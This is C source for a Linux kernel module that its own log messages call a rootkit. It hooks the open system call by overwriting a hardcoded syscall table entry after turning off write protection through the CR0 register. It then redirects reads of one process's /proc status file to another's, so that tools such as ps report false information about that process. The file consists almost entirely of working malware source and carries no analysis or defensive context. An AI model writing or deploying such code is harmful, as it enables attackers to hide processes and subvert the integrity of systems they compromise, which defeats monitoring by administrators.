
#include <asm/cacheflush.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/pgtable_types.h>
#include <linux/highmem.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>

//address of system call table
void **system_call_table_addr = (void*)0xc175f180;

asmlinkage int (*original_open)(const char *pathname, int flags);

asmlinkage int hijack(const char *pathname, int flags) {
    if(strstr(pathname, "/proc/3066/status") != NULL) {
        printk(KERN_ALERT "PS PROCESS HIJACKED %s\n", pathname);
        memcpy(pathname, "/proc/2671/status", strlen(pathname)+1);
    }

    return (*original_open)(pathname, flags);
}


static int __init my_init(void){
    original_open = system_call_table_addr[__NR_open];
    //disable page protection
    write_cr0(read_cr0() & (~ 0x10000));
    system_call_table_addr[__NR_open] = hijack;
    printk(KERN_INFO "rootkit loaded successfully..\n");
    return 0;
}

static void __exit my_exit(void){
    system_call_table_addr[__NR_open] = original_open;
    write_cr0(read_cr0() | 0x10000);
    printk(KERN_INFO "rootkit unloaded successfully..\n");
}

module_init(my_init);
module_exit(my_exit);
